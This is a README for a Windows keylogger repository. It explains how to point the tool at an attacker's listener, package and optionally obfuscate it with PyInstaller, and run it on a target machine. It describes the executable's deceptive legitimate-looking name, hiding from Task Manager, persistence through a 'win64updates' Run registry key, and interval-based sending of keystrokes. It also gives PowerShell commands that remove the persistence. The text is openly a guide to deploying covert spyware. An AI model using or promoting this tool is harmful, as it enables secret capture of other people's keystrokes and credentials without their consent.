# win_keylogger
A persistent keylogger for windows


## How to Use

- Set up a listener or server on your attacker machine.
- Provide the IP address and port number in the specified places in the code.
- Convert the script to an executable (`.exe`) using **PyInstaller** (you can obfuscate it if desired).
- Execute the `.exe` file on the target machine.
- The executable is named to appear legitimate, making it difficult for others to notice.

---

## Limitations

- This executable will only log keystrokes for the current user on the machine.
- It **cannot** log keystrokes that require administrative privileges, such as critical system operations.

---

## Special Features

- The executable sends keystrokes based on **time intervals**.
- When the server is active, it will only send keystrokes logged **after** the last server session was closed.
- While the server is offline, it will continue logging keystrokes to a file.
- This mechanism prevents sending **redundant data** and ensures only new keystrokes are transmitted when the server reconnects.

---

## How to terminate this exe
## To Remove Persistence and Terminate the Process

Run the following 2 commands in **PowerShell** or **Command Prompt**:

- **Remove the registry key to stop persistence:**
This exe will be hidden from task manager, so need to be removed via powershell.
  ```powershell
  remove-itemproperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "win64updates"
  stop-process -name win64update -F


